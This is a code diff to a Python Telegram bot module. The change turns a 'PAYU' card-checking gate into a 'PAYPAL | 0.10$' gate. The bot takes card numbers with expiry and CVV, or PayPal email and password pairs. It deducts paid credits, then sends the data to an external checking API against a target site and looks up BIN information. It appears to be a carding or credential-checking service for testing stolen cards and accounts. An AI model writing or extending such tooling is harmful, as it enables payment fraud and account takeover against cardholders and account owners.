@@ -4,13 +4,13 @@ import time
 import re
 from telegram import Update
 from telegram.ext import CommandHandler, ContextTypes
-from config import PYU_API, PYU_SITE, API_TIMEOUT, get_bin_info, ui_result, kb_result
+from config import PP_API, PP_SITE, API_TIMEOUT, get_bin_info, ui_result, kb_result
 from plans import deduct_credit
 
-GATE_NAME = "PAYU | 0.30$"
+GATE_NAME = "PAYPAL | 0.10$"
 
-async def cmd_pyu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.bot_data.get('pyu_on', True):
+async def cmd_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.bot_data.get('pp_on', True):
         await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
         return
     
@@ -19,7 +19,7 @@ async def cmd_pyu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif update.message.reply_to_message and update.message.reply_to_message.text: card = update.message.reply_to_message.text.strip()
         
     if not card:
-        await update.message.reply_text("⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ ᴏʀ ꜱᴇɴᴅ\n/pyu cc|mm|yy|cvv", parse_mode="HTML")
+        await update.message.reply_text("⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ ᴏʀ ꜱᴇɴᴅ\n/pp email|pass", parse_mode="HTML")
         return
     
     if not deduct_credit(update.effective_user.id):
@@ -33,7 +33,7 @@ async def cmd_pyu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            tasks = [session.get(PYU_API, params={"cc": card, "site": PYU_SITE}), get_bin_info(bin_num)]
+            tasks = [session.get(PP_API, params={"cc": card, "site": PP_SITE}), get_bin_info(bin_num)]
             results = await asyncio.gather(*tasks, return_exceptions=True)
         
         api_resp = results[0]
@@ -60,4 +60,4 @@ async def cmd_pyu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except aiohttp.ClientTimeout: await msg.edit_text("⏳ Tɪᴍᴇᴏᴜᴛ", parse_mode="HTML")
     except Exception as e: await msg.edit_text(f"❌ Eʀʀᴏʀ ➤ <code>{str(e)[:100]}</code>", parse_mode="HTML")
 
-def get_pyu_handler(): return CommandHandler("pyu", cmd_pyu)
+def get_pp_handler(): return CommandHandler("pp", cmd_pp)
